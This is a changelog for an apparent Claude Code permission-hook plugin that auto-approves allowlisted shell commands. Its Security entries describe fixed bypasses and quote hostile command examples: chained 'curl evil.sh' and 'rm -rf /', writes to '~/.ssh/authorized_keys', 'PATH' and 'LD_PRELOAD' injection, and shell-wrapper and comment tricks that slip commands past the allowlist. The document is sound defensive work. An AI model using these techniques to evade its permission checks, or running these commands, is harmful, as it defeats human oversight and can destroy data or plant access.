# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Security
- Fixed allowlist bypass (br-0hat): newline, single `&` and `|&` are now command separators, so every chained command must match the allowlist (previously `npm test\ncurl evil.sh` and `npm test & curl evil` auto-allowed under `Bash(npm test:*)`).
- Redirections to or from a path (`>`, `>>`, `<`, `&>`, `&>>`) and unmatched redirect targets now make the parser throw, so the hook falls back to the normal permission dialog instead of silently dropping the target. Conservatively still allowed: fd merging (`2>&1`, `>&2`, `2>&-`) and redirects to exactly `/dev/null`.
- Unquoted subshell/grouping parentheses now also defer to the permission dialog (command/process substitution and here-docs already did).

### Added
- Initial package structure
- Plugin manifest (plugin.json)
- Hook configuration (hooks.json)
- Main hook entrypoint (permitter.js)
- Environment variable configuration (ENSEMBLE_PERMITTER_DISABLE, PERMITTER_DEBUG, PERMITTER_STRICT)
- Stdin JSON parsing for hook data
- Exit code protocol (0 = allow, 1 = defer)
- Debug logging to stderr
- Stub modules for command-parser, allowlist-loader, and matcher
- README.md documentation
- CHANGELOG.md

## [5.3.0] - 2026-11-24

### Changed
- The PermissionRequest hook now always exits `0`. Its stdout carries the decision (`allow`/`deny`), or is empty to defer to Claude Code's own permission prompt; the previous "exit 1 to defer" protocol was never implemented and is not used.
- A denylist hit now blocks the command outright (`behavior: "deny"` with a message) instead of falling back to a prompt. The echoed command text and the matched rule name in that message are each truncated at 200 characters.
- A shell option cluster that ends in an option with a value (`bash -eo pipefail -c "..."`, `bash -euo pipefail -c "..."`) is no longer read: the invocation is refused and defers to the permission dialog, where it used to be expanded and judged by its inner command. Write the options apart (`bash -e -o pipefail -c "..."`, `bash -o pipefail -c "..."`) and they are expanded as before.

### Security
- The PermissionRequest hook no longer emits the invalid `behavior: "ask"` (Claude Code accepts only `allow`/`deny`). Cases that meant "ask the user" now print no decision and exit 0, so Claude Code shows its own permission prompt, and a denylist hit now returns `behavior: "deny"` with a message instead of being silently discarded.
- The hook command in `hooks.json` is now shell-quoted (`"\"${CLAUDE_PLUGIN_ROOT}/hooks/permitter.js\""`), so an install path containing a space no longer exits 127.
- A `#` that begins a word is now a comment that ends at its own line (the newline still separates commands), and a backslash-newline is deleted as the shell does. An apostrophe in a comment, also one after a line continuation, no longer opens a quote that swallows the lines after it: `git status # don't run` followed by a newline and `rm -rf /` auto-allowed under `Bash(git:*)` although the shell ran the `rm`. Only space, tab and newline are trimmed from the ends of the command (`String.trim()` also removed a no-break space, vertical tab, form feed, carriage return or byte order mark, so a leading one moved a `#` to the start of the command and hid the rest of it). A command that leaves a quote open, or that assembles ANSI-C `$'...'` inside a `bash -c` argument, now defers to the permission dialog instead of being classified from a guess.
- `env` options the parser cannot read now defer to the permission dialog: only `-i`, `-u NAME` and `VAR=value` are stripped, so `env -C /tmp git status` (executable read as `/tmp`), `env --chdir=/tmp git status`, `env -S 'git status'`, `env -0`, `env -v`, `env --` and clustered flags are no longer classified as if the option were absent.
- Assignments to `PATH`, `IFS`, `BASH_ENV`, `ENV`, `ZDOTDIR`, `LD_*` and `DYLD_*` are no longer silently dropped before the program is classified: as a leading `VAR=value`, after `env` (also `env -u`), and in `export`, `declare`, `typeset`, `local`, `set` and `unset`, including the append form `+=`. The ways to reach them without naming them are refused as well: an array subscript (`declare PATH[0]=...`, `declare a[PATH=0]=x`), a nameref (`declare -n`), the integer attribute (`declare -i`), a name built by expansion (`export $v`, `export {PATH,X}=...`), arithmetic expansion (`git status $[PATH=0]`) and, where the assignment runs in the current shell, a value with `$`, `=`, `++` or `--` that bash can evaluate as an assignment (`RANDOM=PATH=0; ...`, `RANDOM=$1`, `export RANDOM=1,PATH=0`). `set` only passes options that make the shell stricter or louder (`-e`, `-u`, `-x`, `-o pipefail`, ...): `set -k` turns `git status LD_PRELOAD=/x.so` into an environment assignment. `FOO=bar npm test`, `NODE_OPTIONS=--max-old-space-size=4096 npm test`, `export FOO=bar` and `export FOO+=bar` are unchanged; `export NODE_OPTIONS=--max-old-space-size=4096; npm test` and `export FOO=$HOME/bin; ...` now ask.
- A file-descriptor duplication (`2>&1`, `>&2`, `<&0`, `2>&-`) no longer swallows the token after it: `2>&1 PATH=/evil git status`, `npm 2>&1 publish test` and `git status; 2>&1 rm` were classified as `git status`, `npm test` and `git status`. `>&1x` is a redirection to the file `1x` for bash, so it now throws like any other redirection to a path instead of being read as `>&1` followed by a command word.
- A `bash -c` / `sh -c` wrapper that holds a segment the parser skips (`unset`, `set`, `local`, `export`, `declare`, a bare assignment, a lone redirection) now defers to the permission dialog as a whole. Classifying every inner segment dropped such a segment, so `bash -c "unset FOO; npm test"` was approved on `npm test` alone, where the parser used to ask. The same commands at the top level (`export FOO=bar; npm test`) are unchanged.
- A redirection inside a shell wrapper is refused like one outside it: the command line a wrapper runs is checked for redirections too, so `bash -c "npm test > ~/.ssh/authorized_keys"`, `bash -c "npm test < /etc/passwd"` and `bash -c "git status; npm test > /etc/passwd"` no longer auto-allow under `Bash(npm test:*)`. A redirection to exactly `/dev/null` and an fd duplication (`2>&1`) stay allowed.
- Every shell hides its command line, not only `bash` and `sh`: `zsh -c "git status; rm -rf /"`, `dash -c ...`, `ksh -c ...` and `/bin/bash -c ...` are expanded into their inner segments, so every inner segment has to match the allowlist.
- A shell `-c` behind a prefix defers to the permission dialog instead of hiding its command line: `sudo bash -c "..."`, `doas bash -c "..."`, `command bash -c "..."`, `env bash -c "..."`, `timeout 5 bash -c "..."` and `nohup bash -c "..."` used to be classified as the prefix alone, so a `Bash(sudo:*)` or `Bash(bash:*)` rule approved whatever the shell ran. `sudo git status`, `sudo -u x git status`, `command -v git` and `env git status` are unchanged.
- The exported `normalizeSegment()` no longer reduces a shell wrapper to its first inner command: a wrapper with more than one inner command throws instead of returning the first one.
- A shell invocation the parser cannot read is refused instead of guessed at: an unknown option (`bash --unknown-option -c "..."`) and a startup file the shell reads before it runs the command (`bash --rcfile ./payload.sh -ic "..."`) defer to the permission dialog, so a wrapper that hides a command line cannot be approved by a rule for the shell alone. An option that turns a flag off (`bash +e -c "..."`) and an option with a value (`bash -O extglob -c "..."`) are read as the options they are: the command string after `-c` is expanded and judged like any other command, so the shell alone does not approve it; the same shell behind a prefix (`env bash +e -c "..."`) defers to the permission dialog.
- A shell is only trusted when it is a bare name or a path in `/bin`, `/usr/bin`, `/sbin` or `/usr/sbin`: `./tools/bash -c "git status"` is a program that happens to be called bash, so it is not expanded and not approved by a `Bash(git:*)` rule. `/bin/bash -c "..."` and `/usr/bin/zsh -c "..."` are expanded as before.
- A `-c` that follows the script operand is the script's argument, not the shell's: `/bin/bash ./payload.sh -c "git status"` and `/bin/bash -- ./payload.sh -c "git status"` run the script, so their command line is not expanded.

## [1.0.0] - TBD

### Added
- Full command parsing with state machine tokenizer
- Operator detection and command splitting
- Environment variable and wrapper stripping
- Subshell extraction (bash -c)
- Settings file loading and merging
- Pattern matching implementation
- Comprehensive test suite
- Security hardening with adversarial tests
